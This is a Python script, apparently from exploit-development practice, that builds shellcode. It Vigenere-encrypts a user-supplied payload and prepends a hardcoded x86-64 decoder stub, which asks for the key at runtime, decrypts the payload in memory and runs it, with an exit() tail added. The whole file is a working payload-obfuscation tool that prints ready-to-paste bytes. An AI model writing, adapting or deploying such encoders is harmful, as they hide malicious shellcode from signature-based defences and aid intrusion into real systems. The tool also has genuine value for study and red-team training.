# Vigenere Payload Encoder
# Builds shellcode containing a Vigenere encrypted payload
# Requests decrypt key at runtime
# Example:
#      python vig_builder.py 0x90,0x90,0x90 P@55w0rd

import argparse
import itertools
import sys

chunkCount = 0

def main():
	global chunkCount

	args = setArgs()

	# The two upper case 0xFF bytes at index 52 and 53 are the payload size counter. 
	# This field is automatically populated by the script.
	vig_decode = [0xbb,0x65,0x79,0x3f,0x0a,0x48,0xc1,0xe3,0x08,0x48,
	              0x83,0xc3,0x4b,0x53,0x48,0x89,0xe6,0x6a,0x05,0x5a,
	              0x6a,0x01,0x58,0x0f,0x05,0x6a,0x40,0x5a,0x48,0x01,
	              0xd4,0x48,0x89,0xe6,0x48,0x31,0xc0,0x50,0x5f,0x0f,
	              0x05,0x48,0xff,0xc8,0xeb,0x26,0x5f,0x48,0x31,0xc9,
	              0x66,0xb9,0xFF,0xFF,0x66,0xf7,0xd1,0x48,0x31,0xd2,
	              0x8a,0x1f,0x2a,0x1c,0x16,0x88,0x1f,0x48,0xff,0xc7,
	              0x48,0xff,0xc2,0x38,0xd0,0x75,0x03,0x48,0x31,0xd2,
	              0xe2,0xea,0xeb,0x05,0xe8,0xd5,0xff,0xff,0xff]

 	exit_tail = [0x6a, 0x3c, 0x58, 0x0f, 0x05]

	bChunks = args.shellcode.split(',')

	if len(bChunks) < 2:
		print("Shellcode should be in 0xXX,0xXX,0xXX format!")
		quit()

	print("")
	
	# Set payload size value in decoder stub
	payload_counter = 0xffff - len(bChunks)
	vig_decode[52] = payload_counter & 255
	vig_decode[53] = payload_counter >> 8
	
	# Encrypt payload
	payload = encrypt(bChunks, args.key)
	
	# Dump decode header
	for d in vig_decode:
		sys.stdout.write("0x{0:02x},".format(d))
		chunkCheck()
		
	# Dump encrypted payload
	for p in payload:
		sys.stdout.write("0x{0:02x},".format(p))
		chunkCheck()
		
	# Add exit() tail
	for e in exit_tail:
		sys.stdout.write("0x{0:02x},".format(e))
		chunkCheck()
		
	print("\n")

	# Repeat in \x format
	chunkCount = 0

	# Add decode header
	for d in vig_decode:
		sys.stdout.write("\\x{0:02x}".format(d))
		chunkCheck()
		
	# Dump encrypted payload
	for p in payload:
		sys.stdout.write("\\x{0:02x}".format(p))
		chunkCheck()
		
	# Add exit() tail
	for e in exit_tail:
		sys.stdout.write("\\x{0:02x}".format(e))
		chunkCheck()

	print("\n")
	
# Vigenere encrypt
def encrypt(clear, keystr):
	key = itertools.cycle(keystr)
	cipher = bytearray()
	for b in clear:
		offset = ord(next(key))
		cipher.append((int(b, 16)+offset)%256)

	return cipher
	

# Prettify Output
def chunkCheck():
	global chunkCount
	
	chunkCount+=1
	if chunkCount > 10:
		sys.stdout.write('\n')
		chunkCount = 0

# Commandline args parser
def setArgs():
	parser = argparse.ArgumentParser(description='Build shellcode with a Vigenere encrypted payload')
	parser.add_argument('shellcode', help='A shellcode string in 0xXX,0xXX,0xXX format.')
	parser.add_argument('key', help='The encryption key string')

	return parser.parse_args()


if __name__ == '__main__':
	main()

